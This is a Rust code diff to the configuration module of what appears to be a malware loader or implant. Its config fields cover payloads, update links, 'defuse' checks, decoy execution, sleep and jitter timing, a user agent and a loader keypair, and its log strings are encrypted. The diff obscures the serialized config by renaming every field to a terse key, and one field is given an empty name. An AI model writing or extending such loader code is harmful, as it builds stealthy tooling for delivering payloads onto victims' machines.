@@ -28,31 +28,52 @@ use log::info;
 use log::warn;
 
 #[derive(Serialize, Deserialize, Clone)]
+#[serde(rename = "vf")]
 pub struct VerifSignMaterial {
+    #[serde(rename = "pb")]
     pub peer_public_key_bytes: Vec<u8>,
+    #[serde(rename = "sb")]
     pub sign_bytes: Vec<u8>,
 }
 
 #[derive(Serialize, Deserialize, Clone)]
+#[serde(rename = "c")]
 pub struct Config {
+    #[serde(rename = "ul")]
     pub update_links: BTreeMap<u64, (String, PoolLinks)>,
+    #[serde(rename = "bc")]
     pub backup_config: Vec<FileLink>,
+    #[serde(rename = "pa")]
     pub payloads: Vec<Payload>,
+    #[serde(rename = "du")]
     pub defuse_update: Vec<Defuse>,
+    #[serde(rename = "dp")]
     pub defuse_payload: Vec<Defuse>,
 
+    #[serde(rename = "")]
     pub decoy_defuse_update_success: bool,
+    #[serde(rename = "ds")]
     pub decoy_defuse_payload_success: bool,
+    #[serde(rename = "dc")]
     pub decoy_update_config: Vec<Payload>,
+    #[serde(rename = "de")]
     pub decoy_payload_exec: Vec<Payload>,
+    #[serde(rename = "db")]
     pub decoy_before_payload: bool, // on verra
 
+    #[serde(rename = "sm")]
     pub sign_material: VerifSignMaterial,
+    #[serde(rename = "sp")]
     pub sleep: u64,
+    #[serde(rename = "jt")]
     pub jitt: u64,
+    #[serde(rename = "lt")]
     pub link_timeout: u64,
+    #[serde(rename = "lu")]
     pub link_user_agent: String,
+    #[serde(rename = "lk")]
     pub loader_keypair: Vec<u8>,
+    #[serde(rename = "d")]
     pub date: DateTime<Utc>,
 }
 
@@ -145,12 +166,6 @@ impl Config {
         new_loader.sign_loader(key_pair);
         new_loader
     }
-    /* 
-    pub fn return_sign_data(&self) -> String {
-        let copy_loaderconf = &mut self.clone();
-        copy_loaderconf.sign_material.sign_bytes = vec![];
-        format!("sign_data: {:?}", copy_loaderconf)
-    }*/
     
     pub fn return_sign_data(&self) -> Vec<u8> {
         let copy_loaderconf = &mut self.clone();
@@ -244,7 +259,7 @@ impl Config {
                 nb_payload,
                 &self.payloads.len(),
                 encrypt_string!(" payload: "),
-                serde_json::to_string_pretty(&payload).unwrap_or_default()
+                serde_json::to_string(&payload).unwrap_or_default()
             );
 
             //clean the running_thread
@@ -373,7 +388,7 @@ impl Config {
         let mut check_this_defuse = true;
         for defuse in defuse_list {
             info!(
-                "{}/{}{}{:?}",
+                "{}/{}{}{}",
                 nb_defuse,
                 defuse_list.len(),
                 encrypt_string!(" defuse: "),
